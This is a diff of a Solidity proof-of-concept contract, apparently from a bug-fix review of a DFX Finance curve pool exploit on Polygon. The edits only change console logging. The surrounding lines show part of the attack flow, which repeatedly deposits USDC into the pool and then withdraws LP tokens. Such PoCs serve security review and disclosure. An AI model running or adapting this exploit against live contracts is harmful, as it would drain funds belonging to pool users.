@@ -11,8 +11,6 @@ contract DFXFinanceBugfixReview is PoC {
     IERC20[] tokens;
 
     function initiateAttack() external {
-        console.log(">>> Initiate attack\n");
-
         tokens.push(PolygonTokens.USDC);
         tokens.push(EURS);
 
@@ -25,8 +23,7 @@ contract DFXFinanceBugfixReview is PoC {
     }
 
     function _executeAttack() internal {
-        console.log(PolygonTokens.USDC.balanceOf(address(this)));
-        console.log(">>> Execute attack\n");
+        console.log("\n>>> Execute attack");
 
         // Approve curve pool to use funds
         PolygonTokens.USDC.approve(address(curve_pool), PolygonTokens.USDC.balanceOf(address(this)));
@@ -47,12 +44,10 @@ contract DFXFinanceBugfixReview is PoC {
             curve_pool.deposit(deposit, minQuoteAmount, minBaseAmount, maxQuoteAmount, maxBaseAmount, deadline);
         }
 
-        console.log("Attacker balance after deposit attack");
         snapshotAndPrint(address(this), tokens);
 
         console.log("Withdraw curve pool LP tokens");
 
-        console.log("CURVE balance of attacker");
         IERC20[] memory curve_token = new IERC20[](1);
         curve_token[0] = IERC20(address(curve_pool));
         snapshotAndPrint(address(this), curve_token);
@@ -65,8 +60,7 @@ contract DFXFinanceBugfixReview is PoC {
     }
 
     function _completeAttack() internal {
-        // console.log("Curve pool balance after attack");
-        // snapshotAndPrint(address(curve_pool), tokens);
+        console.log("\n>>> Complete attack");
     }
 }
 
